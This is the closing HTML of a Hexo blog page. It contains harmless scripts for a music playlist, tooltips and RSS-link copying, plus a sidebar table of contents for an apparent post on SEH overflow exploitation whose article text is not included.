style="border:1px solid #ccc; margin:10px 0"><audio id="bg-music"><source src="/mp3/music/music_1.mp3" type="audio/mpeg"></audio><script>document.addEventListener("DOMContentLoaded", function () {
+  var playlist = [
+    "/mp3/music/music_1.mp3",
+    "/mp3/music/sugar_story.mp3",
+    "/mp3/music/story_music_box.mp3",
+    "/mp3/music/last_page.mp3",
+    "/mp3/music/sunset_memory.mp3",
+    "/mp3/music/welcome_home.mp3",
+    "/mp3/music/canon.mp3",
+    "/mp3/music/arigadou.mp3",
+  ];
+
+  var current = 0;
+  const audio = document.getElementById("bg-music");
+  const btn = document.getElementById("music-toggle");
+  const prevBtn = document.getElementById("music-prev");
+  const nextBtn = document.getElementById("music-next");
+  const indexDisplay = document.getElementById("music-index");
+
+  function updateDisplay() {
+    indexDisplay.innerText = `Currently: ${current + 1} / ${playlist.length}`;
+  }
+
+  updateDisplay();
+
+  btn.addEventListener("click", function () {
+    if (audio.paused) {
+      audio.src = playlist[current];
+      audio.play();
+      btn.innerText = "⏸ Pause Music";
+    } else {
+      audio.pause();
+      btn.innerText = "▶ Play Music";
+    }
+  });
+
+  nextBtn.addEventListener("click", function () {
+    const wasPlaying = !audio.paused;
+
+    current = (current + 1) % playlist.length;
+
+    audio.src = playlist[current];
+    audio.load();
+
+    if (wasPlaying) {
+      audio.play();
+    }
+
+    updateDisplay();
+  });
+
+  prevBtn.addEventListener("click", function () {
+    const wasPlaying = !audio.paused;
+
+    current--;
+
+    if (current < 0)
+      current = playlist.length - 1;
+
+    audio.src = playlist[current];
+    audio.load();
+
+    if (wasPlaying) {
+      audio.play();
+    }
+
+    updateDisplay();
+  });
+
+  audio.addEventListener("ended", function() {
+    current = (current + 1) % playlist.length;
+    audio.src = playlist[current];
+    audio.play();
+    updateDisplay();
+  });
+});
+</script><script>document.addEventListener("DOMContentLoaded", function () {
+  const animeImg = document.getElementById("anime-img");
+
+  animeImg.addEventListener("click", function() {
+    
+    const tip = document.createElement("div");
+    tip.innerText = "?";
+    tip.style.position = "absolute";
+    tip.style.top = "-50px";
+    tip.style.left = "50%";
+    tip.style.transform = "translateX(-50%)";
+    tip.style.backgroundColor = "#fff";
+    tip.style.color = "rgb(16, 174, 11)";
+    tip.style.padding = "2px 6px";
+    tip.style.border = "1px solid #ccc";
+    tip.style.borderRadius = "8px";
+    tip.style.boxShadow = "0 3px 6px rgba(0,0,0,0.2)";
+    tip.style.fontSize = "50px";
+    tip.style.fontWeight = "bold";
+    tip.style.zIndex = "1000";
+    tip.style.opacity = "1";
+    tip.style.transition = "opacity 1s, top 1s";
+    
+    animeImg.parentElement.appendChild(tip);
+
+    setTimeout(() => {
+      tip.style.opacity = "0";
+      tip.style.top = "-60px";
+      setTimeout(() => tip.remove(), 1000);
+    }, 2000);
+  });
+});
+</script><script>document.addEventListener("DOMContentLoaded", function () {
+  const rssBtn = document.getElementById("rss-copy-button");
+
+  rssBtn.addEventListener("click", async () => {
+    const rssUrl = window.location.origin + "/atom.xml";
+    try {
+      await navigator.clipboard.writeText(rssUrl);
+
+      const tip = document.createElement("div");
+      tip.innerText = "RSS link copied!";
+      tip.style.position = "absolute";
+      tip.style.top = "-30px";
+      tip.style.left = "50%";
+      tip.style.transform = "translateX(-50%)";
+      tip.style.backgroundColor = "#0d0d0d";
+      tip.style.color = "#00fff7";
+      tip.style.border = "1px solid #ff00ff";
+      tip.style.boxShadow = "0 0 8px #ff00ff, 0 0 16px #00fff7";
+      tip.style.padding = "2px 6px";
+      tip.style.borderRadius = "8px";
+      tip.style.fontSize = "14px";
+      tip.style.fontWeight = "bold";
+      tip.style.zIndex = "1000";
+      tip.style.opacity = "1";
+      tip.style.transition = "opacity 1s, top 1s";
+
+      rssBtn.style.position = "relative";
+      rssBtn.appendChild(tip);
+
+      setTimeout(() => {
+        tip.style.opacity = "0";
+        tip.style.top = "-40px";
+        setTimeout(() => tip.remove(), 1000);
+      }, 2000);
+
+    } catch (err) {
+      console.error("Failed to copy: ", err);
+    }
+  });
+});
+</script></div><div id="aside-block"><div id="toc-div"><h1>Catalog</h1><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Introduction"><span class="toc-number">1.</span> <span class="toc-text">Introduction</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#What-is-SEH"><span class="toc-number">2.</span> <span class="toc-text">What is SEH</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Why-SEH"><span class="toc-number">3.</span> <span class="toc-text">Why SEH?</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#SEH-Overflow"><span class="toc-number">4.</span> <span class="toc-text">SEH Overflow</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Exploit"><span class="toc-number">5.</span> <span class="toc-text">Exploit</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Conclusion"><span class="toc-number">6.</span> <span class="toc-text">Conclusion</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#THANKS-FOR-READING"><span class="toc-number">7.</span> <span class="toc-text">THANKS FOR READING</span></a></li></ol></div></div><footer><nobr>Published with <a target="_blank" rel="noopener" href="http://hexo.io">Hexo</a></nobr></footer></aside></main><canvas id="canvas-dust"></canvas><script src="/js/search.js"></script><script src="/js/custom.js"></script><script src="/js/arknights.js"></script><script src="//unpkg.com/lightgallery@2.7.1/lightgallery.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/zoom/lg-zoom.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/thumbnail/lg-thumbnail.min.js"></script><script src="/js/pjax.js"></script><script class="pjax-js">reset= () => {code.findCode();
+document.querySelector('.lg-container')?.remove()
+lightGallery(document.getElementById('post-bg'), {
+  plugins: [lgZoom,lgThumbnail],
+  selector: '.item-img'})}</script><script>window.addEventListener("load",() => {pjax = new Pjax({
+ cacheBust: false,
+ selectors: ['title','article','#aside-block','.pjax-js'],
+ switches: {'article': Pjax.switches.sideBySide},
+ switchesOptions: {
+   'article': {
+     classNames: {
+       remove: "pjax-out",
+       add: "pjax-in"
+     }
+   }
+ }
+});
+document.addEventListener("pjax:complete", reset);reset()})</script><script src="/js/slide.js"></script></body></html>
